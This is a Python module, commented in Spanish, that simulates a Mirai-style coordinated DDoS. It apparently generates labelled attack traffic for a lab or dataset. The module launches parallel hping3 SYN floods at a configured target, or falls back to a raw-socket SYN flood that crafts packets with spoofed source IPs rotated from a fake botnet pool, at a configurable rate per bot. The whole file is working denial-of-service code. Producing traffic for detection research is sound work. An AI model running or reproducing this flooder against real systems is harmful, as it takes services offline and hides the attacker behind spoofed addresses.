"""Mirai-coordinated DDoS — N bots IoT lanzan SYN flood simultáneo.

Si hping3 está disponible, lanza N procesos --flood (uno por bot).
Si NO (causa histórica del rc=1: hping3 ausente en el container), hace fallback
a un SYN flood puro-Python con raw socket: source IPs spoofed rotando (la botnet)
y source ports aleatorios → miles de flujos TCP distintos etiquetados
MIRAI_COORDINATED, sin depender de binarios externos.
"""

from __future__ import annotations

import os
import random
import shutil
import socket
import struct
import subprocess
import sys
import time


def _find_hping3() -> str | None:
    p = shutil.which("hping3")
    if p:
        return p
    for cand in ("/usr/sbin/hping3", "/usr/bin/hping3", "/sbin/hping3"):
        if os.path.exists(cand) and os.access(cand, os.X_OK):
            return cand
    return None


def run(cfg: dict) -> int:
    target_ip = cfg["target_ip"]
    target_port = cfg["target_port"]
    duration = cfg["duration_s"]
    n_bots = max(len(cfg.get("bots", [])), 1)

    hping = _find_hping3()
    if hping:
        rc = _hping_flood(hping, target_ip, target_port, duration, n_bots)
        if rc == 0:
            return 0
        print("[!] hping3 falló, fallback a raw SYN puro-Python", file=sys.stderr)

    return _raw_syn_flood(target_ip, target_port, duration, cfg)


def _hping_flood(hping: str, target_ip: str, target_port: int, duration: int, n_flows: int) -> int:
    procs = []
    for _ in range(n_flows):
        cmd = [hping, "--flood", "-S", "-p", str(target_port), target_ip]
        try:
            procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except OSError as e:
            print(f"[!] Popen({hping}) falló: {e}", file=sys.stderr)
    if not procs:
        return 1
    time.sleep(duration)
    for p in procs:
        p.terminate()
        try:
            p.wait(timeout=5)
        except subprocess.TimeoutExpired:
            p.kill()
    return 0


def _raw_syn_flood(target_ip: str, target_port: int, duration: int, cfg: dict) -> int:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError:
        print("[!] Mirai raw SYN requiere root + raw socket", file=sys.stderr)
        return 1

    botnet = _bot_pool(cfg.get("botnet_base_ip", "10.10.1.50"), int(cfg.get("botnet_size", 64)))
    rate = int(cfg.get("rate_pps_per_bot", 8000)) * max(len(botnet), 1)
    period = 1.0 / max(rate, 1.0)
    end = time.time() + duration
    nb, i = len(botnet), 0
    while time.time() < end:
        src = botnet[i % nb]
        sport = random.randint(1024, 65535)
        i += 1
        seg = _tcp_syn(src, target_ip, sport, target_port)
        pkt = _ip(src, target_ip, len(seg)) + seg
        try:
            sock.sendto(pkt, (target_ip, 0))
        except OSError:
            pass
        time.sleep(period)
    sock.close()
    return 0


def _bot_pool(base_ip: str, n: int) -> list[str]:
    a, b, c, d = base_ip.split(".")
    start = int(d)
    return [f"{a}.{b}.{c}.{(start + k) % 254 + 1}" for k in range(min(n, 254))]


def _ip(src: str, dst: str, payload_len: int) -> bytes:
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + payload_len, 1, 0, 64, socket.IPPROTO_TCP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def _tcp_syn(src: str, dst: str, sport: int, dport: int) -> bytes:
    seq = random.randint(0, 0xFFFFFFFF)
    offset_flags = (5 << 12) | 0x02  # data offset 5, SYN
    hdr = struct.pack("!HHLLHHHH", sport, dport, seq, 0, offset_flags, 65535, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(hdr))
    chk = _checksum(pseudo + hdr)
    return struct.pack("!HHLLHHHH", sport, dport, seq, 0, offset_flags, 65535, chk, 0)


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF
